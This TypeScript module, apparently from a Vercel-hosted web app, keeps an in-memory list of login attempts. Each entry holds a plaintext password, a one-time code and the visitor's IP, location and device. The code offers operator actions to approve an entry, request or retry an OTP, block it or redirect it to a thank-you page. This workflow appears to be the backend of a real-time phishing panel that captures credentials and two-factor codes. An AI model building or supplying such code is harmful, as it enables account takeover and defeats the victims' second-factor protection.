// In-memory store for Vercel compatibility
// Note: This data is ephemeral and will be lost when the server restarts or the lambda spins down.
// For persistent storage in production, use a real database (Postgres, KV, etc).

export type LoginStatus = 'PENDING_APPROVAL' | 'OTP_REQUESTED' | 'OTP_SUBMITTED' | 'APPROVED' | 'REDIRECT_THANK_YOU' | 'RETRY_OTP' | 'BLOCKED'

export interface LoginRequest {
    id: string
    username: string
    password?: string
    status: LoginStatus
    otp?: string
    timestamp: number
    ip?: string
    city?: string
    country?: string
    userAgent?: string
    device?: string
}

// Global variable to hold state across requests in the same lambda instance
// This is not perfect for serverless but prevents the 500 crash.
// In a real Vercel deployment, you should use Vercel KV or a DB.
const globalStore: { requests: LoginRequest[] } = { requests: [] }

export const loginStore = {
    createRequest: (data: Omit<LoginRequest, 'id' | 'timestamp' | 'status'>) => {
        const newRequest: LoginRequest = {
            ...data,
            id: Math.random().toString(36).substring(7),
            timestamp: Date.now(),
            status: 'PENDING_APPROVAL'
        }
        globalStore.requests.push(newRequest)
        // Keep only last 50 requests
        if (globalStore.requests.length > 50) globalStore.requests.shift()
        return newRequest
    },

    getRequest: (id: string) => {
        return globalStore.requests.find(req => req.id === id)
    },

    getAllRequests: () => {
        return [...globalStore.requests].sort((a, b) => b.timestamp - a.timestamp)
    },

    updateStatus: (id: string, status: LoginStatus) => {
        const req = globalStore.requests.find(req => req.id === id)
        if (req) {
            req.status = status
            return req
        }
        return null
    },

    submitOtp: (id: string, otp: string) => {
        const req = globalStore.requests.find(req => req.id === id)
        if (req) {
            req.otp = otp
            req.status = 'OTP_SUBMITTED'
            return req
        }
        return null
    },

    cleanup: () => {
        globalStore.requests = []
    }
}
